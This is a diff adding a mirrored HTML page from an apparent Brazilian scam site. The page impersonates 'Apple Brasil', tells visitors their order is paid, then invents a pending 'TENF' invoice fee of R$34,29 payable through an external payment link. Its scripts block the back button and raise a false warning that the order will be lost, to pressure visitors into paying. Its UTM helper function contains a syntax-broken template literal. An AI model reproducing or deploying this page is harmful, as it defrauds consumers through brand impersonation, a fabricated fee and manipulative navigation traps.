@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="pt">
+<!-- Mirrored from premios-quiz.online/html/electrolux/electrolux2/up/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 04 Jul 2024 22:42:39 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Apple Brasil</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="styles.html">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+
+<script>
+    let shouldShowPopup = true;
+
+    window.onbeforeunload = function(event) {
+        if (shouldShowPopup) {
+            const customPopup = document.getElementById('custom-popup');
+            customPopup.style.display = 'block';
+
+            // Para navegadores modernos
+            event.preventDefault();
+            event.returnValue = '';
+            return 'ATENÇÃO!\n\nAo sair desta página sem pagar a taxa, sua encomenda será perdida e outra pessoa terá a oportunidade de resgatá-la.';
+        }
+    };
+
+    function hideCustomPopup() {
+        const customPopup = document.getElementById('custom-popup');
+        customPopup.style.display = 'none';
+    }
+
+    function preventBackNavigation() {
+        window.history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function(event) {
+            const customPopup = document.getElementById('custom-popup');
+            customPopup.style.display = 'block';
+            window.history.pushState(null, '', window.location.href);
+        });
+    }
+
+    window.onload = function() {
+        preventBackNavigation();
+
+        const finalButton = document.getElementById('finalButton');
+        if (finalButton) {
+            finalButton.addEventListener('click', function() {
+                shouldShowPopup = false;
+            });
+        }
+    };
+</script>
+</head>
+<body>
+   
+
+    <nav class="navbar" style="padding-top: 15px; background-color: #0F00CC;">
+    <div class="menu-icon" style="padding-left: 3%;">
+        <img src="https://cloudfox-digital-products.s3.amazonaws.com/uploads/user/765XDZBOXPGVJwL/public/stores/Wrn4RgQXQNGwBV7/logo/HFxMAc9cwGWRvjywdYTfLpo6Sclcgq34YftUpGr3.png" style="height: 5vh;" alt="Logo Central Vivara">
+    </div>
+
+    <div class="logo-central">
+    </div>
+
+    <div class="menu-icon" style="padding-right: 3%;">
+        <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: white">shopping_cart</span>
+    </div>
+</nav>
+
+
+
+
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Emita sua nota fiscal</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Parabéns! Seu pagamento foi concluido com sucesso, agora é necessário que faça a emissão da Nota Fiscal. Clique abaixo para prosseguir!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Emitir Nota Fiscal</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Emissão da Nota Fiscal</p>
+
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container3">
+                        <span class="material-symbols-outlined">receipt</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Nota fiscal sendo emitida!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que existe uma pendência no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">É necessário realizar o pagamento da TENF (Taxa de Emissão da Nota Fiscal) para Emitir a Nota Fiscal do seu produto e realizarmos o despacho. No valor único de R$34,29</div>
+                    </div>
+                </div>
+            </div>
+
+<script>
+    
+    function openNewWindowWithUTMs(url) {
+    // Extrai os parâmetros UTM da URL atual
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    let utms = '';
+
+    // Constrói a string dos parâmetros UTM
+    for (let [key, value] of currentUrlParams.entries()) {
+        if (key.startsWith('')) {
+            utms += ${key}=${value}&;
+        }
+    }
+
+    // Remove o último '&'
+    if (utms) {
+        utms = utms.slice(0, -1); // remove the last '&'
+    }
+
+    // Adiciona os parâmetros UTM à URL especificada
+    const fullUrl = url + (utms? '?' + utms : '');
+
+    // Abre a nova janela ou guia com os parâmetros UTM
+    window.open(fullUrl, '_blank');
+}
+    
+</script>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+    <button class="styled-button2" onclick="window.location.href='https://pay.farmresposta.shop/NDr8gmblKjV3Bmj' + window.location.search">
+        <span class="button-text">
+            <span class="button-title2">Pagar o TENF</span>
+        </span>
+        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+    </button>
+</div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        </div>
+
+        
+
+    </div>
+    <div id="custom-popup">
+        <div id="popup-content">
+            <h2>ATENÇÃO!</h2>
+            <p>Ao sair desta página sem pagar a taxa, sua encomenda será perdida e outra pessoa terá a oportunidade de resgatá-la.</p>
+            <button onclick="window.location.href='https://pay.farmresposta.shop/NDr8gmblKjV3Bmj'">Efetuar pagamento da TENF</button>
+        </div>
+    </div>
+    
+    <script src="js/scripts.js"></script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl492182'},{'dcenter':'p3'},{'cp_id':'9883949'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body>
+<!-- Mirrored from premios-quiz.online/html/electrolux/electrolux2/up/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 04 Jul 2024 22:42:41 GMT -->
+</html>
